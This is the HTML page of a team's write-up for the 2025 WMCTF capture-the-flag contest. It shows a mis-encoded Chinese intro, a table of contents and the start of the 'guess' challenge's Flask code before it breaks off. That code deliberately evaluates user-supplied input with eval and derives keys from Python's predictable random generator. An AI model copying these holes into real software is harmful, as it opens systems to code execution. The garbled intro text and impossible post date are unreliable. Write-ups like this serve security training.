<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2025 WMCTF SU WriteUp -</title><meta name=description content="æ„Ÿè°¢ W&amp;M çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡ WMCTF æˆ‘ä»¬ SU å–å¾—äº† ç¬¬äºŒåğŸ¥ˆ çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2025 WMCTFçš„ WriteUpã€‚"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/wmctf-2025-su-wu\/","name":"2025 wmctf su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2025 WMCTF SU WriteUp","description":"æ„Ÿè°¢ W\u0026amp;M çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡ WMCTF æˆ‘ä»¬ SU å–å¾—äº† ç¬¬äºŒåğŸ¥ˆ çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚\nä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2025 WMCTFçš„ WriteUpã€‚\n","inLanguage":"en","wordCount":8152,"datePublished":"2025-09-21T19:32:48\u002b00:00","dateModified":"2025-09-21T19:32:48\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["WMCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/wmctf-2025-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2025 WMCTF SU WriteUp"><meta property="og:description" content="æ„Ÿè°¢ W&amp;M çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡ WMCTF æˆ‘ä»¬ SU å–å¾—äº† ç¬¬äºŒåğŸ¥ˆ çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2025 WMCTFçš„ WriteUpã€‚"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/wmctf-2025-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2025 WMCTF SU WriteUp"><meta name=twitter:description content="æ„Ÿè°¢ W&amp;M çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡ WMCTF æˆ‘ä»¬ SU å–å¾—äº† ç¬¬äºŒåğŸ¥ˆ çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2025 WMCTFçš„ WriteUpã€‚"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href="https://su-team.cn/css/codeblock.css?v=20260212-fix3"><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2025 WMCTF SU WriteUp</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on September 21, 210948
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;39&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;8152&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#guess>guess</a></li><li><a href=#pdf2text>pdf2text</a></li></ul></li><li><a href=#reverse>Reverse</a><ul><li><a href=#catfriend>catfriend</a></li><li><a href=#appfriend>appfriend</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#check-in>Check in</a></li><li><a href=#questionnaire>Questionnaire</a></li><li><a href=#shopping-company1>Shopping company1</a></li><li><a href=#shopping-company3>Shopping company3</a></li><li><a href=#shopping-company2>Shopping company2</a></li><li><a href=#phishing-email>phishing email</a></li><li><a href=#voice_hacker>Voice_hacker</a></li></ul></li><li><a href=#crypto>CRYPTO</a><ul><li><a href=#splitmaster>SplitMaster</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>æ„Ÿè°¢ W&amp;M çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡ WMCTF æˆ‘ä»¬ SU å–å¾—äº† ç¬¬äºŒåğŸ¥ˆ çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_<a href=mailto:xctf@126.com>xctf@126.com</a> æˆ–è€…ç›´æ¥è”ç³»baozongwi QQ:2405758945ã€‚</p><p>ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2025 WMCTFçš„ WriteUpã€‚</p><p><img src=/img/2025-WMCTF/1.PNG alt=img></p><h1 id=web>Web</h1><h2 id=guess>guess</h2><p>åº”ç”¨ä»£ç å¦‚ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>jsonify</span><span class=p>,</span> <span class=n>session</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>redirect</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rd</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>Random</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_random_string</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=n>rd</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>secret_key</span> <span class=o>=</span> <span class=n>generate_random_string</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>users</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=n>generate_random_string</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/register&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>,</span> <span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>register</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;GET&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;register.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>get_json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;password&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>username</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>password</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;error&#39;</span><span class=p>:</span> <span class=s1>&#39;Username and password are required&#39;</span><span class=p>}),</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=n>user</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=n>username</span> <span class=k>for</span> <span class=n>user</span> <span class=ow>in</span> <span class=n>users</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;error&#39;</span><span class=p>:</span> <span class=s1>&#39;Username already exists&#39;</span><span class=p>}),</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>user_id</span> <span class=o>=</span> <span class=n>generate_random_string</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>users</span><span class=o>.</span><span class=n>append</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;user_id&#39;</span><span class=p>:</span> <span class=n>user_id</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;username&#39;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;password&#39;</span><span class=p>:</span> <span class=n>password</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;message&#39;</span><span class=p>:</span> <span class=s1>&#39;User registered successfully&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;user_id&#39;</span><span class=p>:</span> <span class=n>user_id</span>
</span></span><span class=line><span class=cl>    <span class=p>}),</span> <span class=mi>201</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>,</span> <span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;GET&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;login.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>get_json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;password&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>username</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>password</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;error&#39;</span><span class=p>:</span> <span class=s1>&#39;Username and password are required&#39;</span><span class=p>}),</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>user</span> <span class=o>=</span> <span class=nb>next</span><span class=p>((</span><span class=n>user</span> <span class=k>for</span> <span class=n>user</span> <span class=ow>in</span> <span class=n>users</span> <span class=k>if</span> <span class=n>user</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=n>username</span> <span class=ow>and</span> <span class=n>user</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=n>password</span><span class=p>),</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>user</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;error&#39;</span><span class=p>:</span> <span class=s1>&#39;Invalid credentials&#39;</span><span class=p>}),</span> <span class=mi>401</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>user</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>user</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;message&#39;</span><span class=p>:</span> <span class=s1>&#39;Login successful&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;user_id&#39;</span><span class=p>:</span> <span class=n>user</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>}),</span> <span class=mi>200</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.post</span><span class=p>(</span><span class=s1>&#39;/api&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>protected_api</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>get_json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>key1</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;key&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>key1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;error&#39;</span><span class=p>:</span> <span class=s1>&#39;key are required&#39;</span><span class=p>}),</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>key2</span> <span class=o>=</span> <span class=n>generate_random_string</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=nb>str</span><span class=p>(</span><span class=n>key1</span><span class=p>)</span> <span class=o>==</span> <span class=nb>str</span><span class=p>(</span><span class=n>key2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;message&#39;</span><span class=p>:</span> <span class=s1>&#39;Not Allowed:&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>key2</span><span class=p>)</span> <span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>}),</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;payload&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>payload</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>eval</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=p>{</span><span class=s1>&#39;__builtin__&#39;</span><span class=p>:{}})</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span>
